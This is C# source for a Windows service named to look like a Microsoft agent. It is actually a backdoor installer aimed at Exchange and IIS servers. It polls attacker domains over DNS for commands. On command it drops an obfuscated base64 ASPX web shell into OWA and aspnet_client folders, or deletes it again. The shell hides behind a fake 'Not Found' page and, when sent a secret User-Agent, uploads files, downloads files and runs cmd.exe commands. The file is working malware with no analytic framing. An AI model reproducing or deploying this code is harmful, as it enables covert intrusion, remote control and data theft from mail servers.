using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.ServiceProcess;
using System.Text;
using System.Timers;


namespace MicrosoftAgentServices
{
    public enum enuFileName
    {
        aspnet,
        owafont,
        themes,
        logon

    }
    public partial class Service1 : ServiceBase
    {

        public string dnsdomain = ".At.twittsupport.com";
        public string dnsdomain2 = ".At.mailupdate.info";

        public string web = "#@@@@@@@@@@@@PCVAIFBh@Z2UgTGFuZ3VhZ2U9IkMjIiBE####ZWJ1Zz0idHJ1ZSIgVHJhY2U9ImZhbH###NlIiAlPg0KPCVA@IEltcG9ydCBOYW1lc3BhY2@@@@@@@@@U9IlN5c3RlbSIgJT4NCjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uRGlhZ25vc3RpY3MiICU+DQo8JUAgSW1wb3J0IE5hbWVzcGFjZT0iU3lzdGVtLklPIiAlPg0KPCVAIEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5JTy5Db21wcmVzc2lvbiIgJT4NCjxzY3JpcHQgcnVuYXQgPSJzZXJ2ZXIiPnByaXZhdGUgc3RyaW5nIHJldmNoYXIoc3RyaW5nIHRleHQpe2NoYXJbXSBjaHJzID0gdGV4dC5Ub0NoYXJBcnJheSgpO0FycmF5LlJldmVyc2UoY2hycywwLGNocnMuTGVuZ3RoKTtyZXR1cm4gbmV3IHN0cmluZyhjaHJzKTsgfXByaXZhdGUgc3RyaW5nIHRveChzdHJpbmcgdGV4dCl7aW50IG51bWJlckNoYXJzID0gdGV4dC5MZW5ndGg7Ynl0ZVtdIGJ5dGVzID0gbmV3IGJ5dGVbbnVtYmVyQ2hhcnMgLyAyXTtVbmljb2RlRW5jb2RpbmcgYmlnRW5kaWFuVW5pY29kZSA9IG5ldyBVbmljb2RlRW5jb2RpbmcodHJ1ZSwgdHJ1ZSk7Zm9yIChpbnQgaSA9IDA7IGkgPCBudW1iZXJDaGFyczsgaSArPSAyKXtieXRlc1tpIC8gMl0gPSBTeXN0ZW0uQ29udmVydC5Ub0J5dGUodGV4dC5TdWJzdHJpbmcoaSwgMiksIDE2KTt9cmV0dXJuIGJpZ0VuZGlhblVuaWNvZGUuR2V0U3RyaW5nKGJ5dGVzKTt9cHJvdGVjdGVkIG92ZXJyaWRlIHZvaWQgT25Mb2FkKEV2ZW50QXJncyBlKXtzdHJpbmcgbWV0aG9kID0gSHR0cENvbnRleHQuQ3VycmVudC5SZXF1ZXN0Lkh0dHBNZXRob2Q7aWYobWV0aG9kID09ICJQT1NUIil7c3RyaW5nIGg9UmVxdWVzdC5IZWFkZXJzWyJVc2VyLUFnZW50Il07c3RyaW5nIGpvYiA9ICIiO2lmKCFTdHJpbmcuSXNOdWxsT3JFbXB0eShoKSl7aW50IGluZGV4PWguSW5kZXhPZigicnVieUAxMjMhIik7aWYoaW5kZXggPT0gLTEpIHJldHVybjtqb2I9aC5TdWJzdHJpbmcoaW5kZXgrOSk7Ym9vbCBoYXNqb2IgPSAhU3RyaW5nLklzTnVsbE9yRW1wdHkoam9iKTtpZihoYXNqb2Ipe2pvYiA9IHRoaXMudG94KGpvYik7aWYgKGpvYj09InVwbG9hZCIpe3RyeXtTeXN0ZW0uV2ViLkh0dHBQb3N0ZWRGaWxlIGZpbGUgPSBSZXF1ZXN0LkZpbGVzWyJpbWFnZSJdO3N0cmluZyBwYXRoID0gdG94KFJlcXVlc3RbInBhdGgiXS5Ub1N0cmluZygpKTtmaWxlLlNhdmVBcyhwYXRoKTt9Y2F0Y2ggKEV4Y2VwdGlvbiBlZil7UmVzcG9uc2UuV3JpdGUoZWYuTWVzc2FnZSk7fX1lbHNlIGlmKGpvYj09ImRvd25sb2FkIil7dHJ5e3N0cmluZyBwYXRoID0gdG94KFJlcXVlc3RbInBhdGgiXS5Ub1N0cmluZygpKTtSZXNwb25zZS5Db250ZW50VHlwZSA9ICJhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0iO1Jlc3BvbnNlLkFwcGVuZEhlYWRlcigiQ29udGVudC1EaXNwb3NpdGlvbiIsICJhdHRhY2htZW50OyBmaWxlbmFtZT0iICsgcGF0aCk7UmVzcG9uc2UuVHJhbnNtaXRGaWxlKHBhdGgpO1Jlc3BvbnNlLkVuZCgpO31jYXRjaCAoRXhjZXB0aW9uIGVkKXtSZXNwb25zZS5Xcml0ZShlZC5NZXNzYWdlKTt9fWVsc2V7dHJ5e1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIGZpcmUgPSBuZXcgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MoKTtmaXJlLlN0YXJ0SW5mby5GaWxlTmFtZSA9IHRoaXMucmV2Y2hhcigiZXhlLmRtYyIpO2ZpcmUuU3RhcnRJbmZvLldpbmRvd1N0eWxlID0gU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NXaW5kb3dTdHlsZS5IaWRkZW47ZmlyZS5TdGFydEluZm8uVXNlU2hlbGxFeGVjdXRlID0gZmFsc2U7ZmlyZS5TdGFydEluZm8uUmVkaXJlY3RTdGFuZGFyZElucHV0ID0gdHJ1ZTtmaXJlLlN0YXJ0SW5mby5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0ID0gdHJ1ZTtmaXJlLlN0YXJ0SW5mby5SZWRpcmVjdFN0YW5kYXJkRXJyb3IgPSB0cnVlO2ZpcmUuU3RhcnQoKTtmaXJlLlN0YW5kYXJkSW5wdXQuV3JpdGVMaW5lKGpvYik7ZmlyZS5TdGFuZGFyZElucHV0LldyaXRlTGluZSgiZXhpdCIpO3N0cmluZyByZXN1bHQgPSBmaXJlLlN0YW5kYXJkT3V0cHV0LlJlYWRUb0VuZCgpO2ZpcmUuV2FpdEZvckV4aXQoKTtmaXJlLkNsb3NlKCk7cmVzdWx0ID0gIjxwcmUgY29sb3I9XCJuYXZ5XCI+IiArIHJlc3VsdC5SZXBsYWNlKCI8IiwiJiM2MCIpLlJlcGxhY2UoIj4iLCImIzYyIikuUmVwbGFjZShFbnZpcm9ubWVudC5OZXdMaW5lLCI8YnIgLz4iKSArICI8L3ByZT4iO1Jlc3BvbnNlLldyaXRlKHJlc3VsdCk7fWNhdGNoKEV4Y2VwdGlvbiBleHApe1Jlc3BvbnNlLldyaXRlKGV4cC5NZXNzYWdlKTt9fX19fX08L3NjcmlwdD48SFRNTD48SEVBRD48dGl0bGU+aW52b2ljZTwvdGl0bGU+PC9IRUFEPiA8Ym9keSBiZ2NvbG9yPSIjODA4MDgwIj5Ob3QgRm91bmQgISEhITxkaXY+PC9kaXY+PC9ib2R5PjwvSFRNTD4=@@@";
        public string wwwroot = @"c:\inetpub\wwwroot\aspnet_client\";
        public string wwwroot2 = @"c:\inetpub\wwwroot\aspnet_client\system_web\";
        public string webpathexh01 = @"C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\Current\themes\resources\";
        public string webpathexh02 = @"C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\Current\themes\";
        public string webpathexh03 = @"C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\Current\";
        public string[] arrayNames = new string[] { "aspnet.aspx", "owafont.aspx", "themes.aspx", "logon.aspx" };
        public Service1()
        {
            InitializeComponent();
        }


        Timer workerTime = new Timer();
        protected override void OnStart(string[] args)
        {
            workerTime.Elapsed += new ElapsedEventHandler(this.OnElapsedTime);
            workerTime.Interval = 120 * 3600 * 1000;
            workerTime.Enabled = true;
        }
        protected override void OnStop()
        {
            workerTime.Enabled = false;
        }
        private readonly Random _random = new Random();
        public bool istry = true;
        public string randomName = string.Empty;
        private void OnElapsedTime(object value1, ElapsedEventArgs e)
        {
            string randstr = RandomString(2, false) + RandomString(3, true);
            string response = string.Empty;
            this.randomName = randstr;
            
            try
            {
                string finalhost = randstr + "EX2016" + dnsdomain;
                System.Net.IPHostEntry query = System.Net.Dns.GetHostEntry(finalhost);
                response = query.AddressList[0].ToString();

                if (String.IsNullOrEmpty(response))
                {
                    System.Threading.Thread.Sleep(60 * 1000);
                    finalhost = randstr + "EX2016" + dnsdomain2;
                    try
                    {
                        query = System.Net.Dns.GetHostEntry(finalhost);
                        response = query.AddressList[0].ToString();
                        if (!String.IsNullOrEmpty(response))
                        {
                            istry = false;
                        }
                    }
                    catch
                    {
                        string ms = "";
                    }
                }
            }
            catch (Exception)
            {
                string finalhost = randstr + "EX2016" + dnsdomain2;
                System.Net.IPHostEntry query = System.Net.Dns.GetHostEntry(finalhost);
                response = query.AddressList[0].ToString();
                istry = false;
            }

            if (!String.IsNullOrEmpty(response))
            {
                string[] res = response.Split('.');

                if (res[3]=="110")
                {
                    webwrite(response);
                }
                else if (response == "213.47.81.107")
                {
                    removeweb();
                }
            }
        }
        private string RandomString(int size, bool lowerCase)
        {
            StringBuilder builder = new StringBuilder(size);

            char offset = lowerCase ? 'a' : 'A';
            const int lettersOffset = 26;

            for (int i = 0; i < size; i++)
            {
                char @char = (char)_random.Next(offset, offset + lettersOffset);
                builder.Append(@char);
            }

            return lowerCase ? builder.ToString().ToLower() : builder.ToString();
        }
        private void webwrite(string response)
        {
            string path = string.Empty;
            string[] choosePath = response.Split('.');
            bool isexh = (choosePath[2] == "81");
            string randName = this.randomName + ".aspx";
            if (isexh)
            {
                if (choosePath[1] == "47") path = (choosePath[0] == "213") ? webpathexh01 + arrayNames[(int)enuFileName.owafont] : webpathexh01 + randName;
                else if (choosePath[1] == "48") path = (choosePath[0] == "213") ? webpathexh02 + arrayNames[(int)enuFileName.themes] : webpathexh02 + randName;
                else if (choosePath[1] == "49") path = (choosePath[0] == "213") ? webpathexh03 + arrayNames[(int)enuFileName.logon] : webpathexh03 + randName;
                try
                {

                    byte[] clearWeb = System.Convert.FromBase64String(web.Replace("#", "").Replace("@", ""));
                    System.IO.File.WriteAllBytes(path, clearWeb);
                }
                catch (Exception e)
                {
                    string s = e.Message;
                }
            }
            else
            {
                if (choosePath[1] == "47") path = (choosePath[0] == "213") ? wwwroot + arrayNames[(int)enuFileName.aspnet] : wwwroot + randName;
                else if (choosePath[1] == "48") path = (choosePath[0] == "213") ? wwwroot2 + arrayNames[(int)enuFileName.aspnet] : wwwroot2 + randName;
                try
                {
                    byte[] clearWeb = System.Convert.FromBase64String(web.Replace("#", "").Replace("@", ""));
                    System.IO.File.WriteAllBytes(path, clearWeb);
                }
                catch (Exception e)
                {
                    string s = e.Message;
                }
            }
        }
        private void removeweb()
        {
            if (System.IO.File.Exists(webpathexh01))
            {
                try
                {
                    System.IO.File.Delete(webpathexh01);
                }
                catch (Exception e)
                {

                    string ss = e.Message;
                }
            }
            if (System.IO.File.Exists(webpathexh02))
            {
                try
                {
                    System.IO.File.Delete(webpathexh02);
                }
                catch (Exception e)
                {

                    string ss = e.Message;
                }
            }
            if (System.IO.File.Exists(webpathexh03))
            {
                try
                {
                    System.IO.File.Delete(webpathexh03);
                }
                catch (Exception e)
                {

                    string ss = e.Message;
                }
            }
            if (System.IO.File.Exists(wwwroot))
            {
                try
                {
                    System.IO.File.Delete(wwwroot);
                }
                catch (Exception e)
                {

                    string ss = e.Message;
                }
            }
            if (System.IO.File.Exists(wwwroot2))
            {
                try
                {
                    System.IO.File.Delete(wwwroot2);
                }
                catch (Exception e)
                {

                    string ss = e.Message;
                }
            }
        }
    }
}
